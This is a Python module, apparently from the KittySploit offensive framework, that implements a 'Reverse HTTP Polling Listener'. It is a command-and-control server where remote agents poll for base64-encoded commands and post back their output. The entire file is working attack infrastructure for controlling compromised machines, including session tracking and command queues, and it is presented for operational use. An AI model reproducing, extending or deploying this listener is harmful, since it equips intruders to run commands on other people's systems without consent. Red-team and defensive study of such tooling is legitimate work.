#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import json
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

from kittysploit import *


class Module(Listener):
    __info__ = {
        "name": "Reverse HTTP Polling Listener",
        "description": "HTTP polling C2: agents GET commands and POST command output.",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "handler": Handler.REVERSE,
        "session_type": "polling",
        "protocol": "http_polling",
    }

    lhost = OptString("0.0.0.0", "Listen address", True)
    lport = OptPort(8088, "Listen port", True)
    url_prefix = OptString("/c2", "URL prefix", False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.httpd = None
        self.running = False
        self._pending_commands = {}
        self._received_output = {}
        self._client_id_to_session = {}
        self._session_to_client_id = {}

    def _ensure_session(self, client_id, client_ip):
        if client_id in self._client_id_to_session:
            return self._client_id_to_session[client_id]
        data = {
            "protocol": "http_polling",
            "client_id": client_id,
            "client_ip": client_ip,
            "handler": "reverse",
            "session_type": "polling",
            "listener_type": "reverse_http_polling",
        }
        sid = self._create_session("reverse", client_ip, 0, data)
        if sid:
            self._client_id_to_session[client_id] = sid
            self._session_to_client_id[sid] = client_id
            self._pending_commands[sid] = []
            self._received_output[sid] = []
            print_success(f"HTTP polling agent {client_id} ({client_ip}) -> session {sid}")
        return sid

    def _handler_class(self):
        listener = self
        prefix = "/" + str(self.url_prefix or "/c2").strip("/")

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                return

            def _send(self, status, body, ctype="text/plain"):
                data = body.encode("utf-8") if isinstance(body, str) else body
                self.send_response(status)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)

            def do_GET(self):
                parsed = urlparse(self.path)
                if parsed.path != f"{prefix}/poll":
                    self._send(404, "not found")
                    return
                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                sid = listener._ensure_session(cid, self.client_address[0])
                queue = listener._pending_commands.get(sid, [])
                cmd = queue.pop(0) if queue else ""
                payload = {"command": base64.b64encode(cmd.encode()).decode() if cmd else "", "encoding": "base64"}
                self._send(200, json.dumps(payload), "application/json")

            def do_POST(self):
                parsed = urlparse(self.path)
                if parsed.path != f"{prefix}/result":
                    self._send(404, "not found")
                    return
                length = int(self.headers.get("Content-Length", "0") or 0)
                raw = self.rfile.read(length).decode("utf-8", errors="replace")
                qs = parse_qs(parsed.query)
                cid = (qs.get("id") or [""])[0]
                if not cid:
                    self._send(400, "missing id")
                    return
                sid = listener._ensure_session(cid, self.client_address[0])
                try:
                    data = json.loads(raw) if raw else {}
                    output = data.get("output", "")
                    if data.get("encoding") == "base64":
                        output = base64.b64decode(output).decode("utf-8", errors="replace")
                except Exception:
                    output = raw
                listener._append_output(sid, output)
                self._send(200, "ok")

        return Handler

    def run(self, background=False):
        host = str(self.lhost or "0.0.0.0")
        port = int(self.lport or 8088)
        self.httpd = ThreadingHTTPServer((host, port), self._handler_class())
        self.running = True
        self.listener_thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.listener_thread.start()
        print_success(f"Reverse HTTP polling listener on http://{host}:{port}{self.url_prefix}")
        print_info("Agent: GET /c2/poll?id=<client>, POST /c2/result?id=<client>")
        if background:
            return True
        try:
            while self.running:
                time.sleep(0.2)
        except KeyboardInterrupt:
            self.shutdown()
        return True

    def set_pending_command(self, session_id, cmd):
        self._pending_commands.setdefault(session_id, []).append(cmd)

    def _append_output(self, session_id, text):
        self._received_output.setdefault(session_id, []).append(text)
        self._received_output[session_id] = self._received_output[session_id][-500:]

    def get_output(self, session_id, clear=False):
        out = "\n".join(self._received_output.get(session_id, []))
        if clear:
            self._received_output[session_id] = []
        return out

    def get_output_lines(self, session_id, last_n=50):
        return self._received_output.get(session_id, [])[-last_n:]

    def shutdown(self):
        self.running = False
        if self.httpd:
            self.httpd.shutdown()

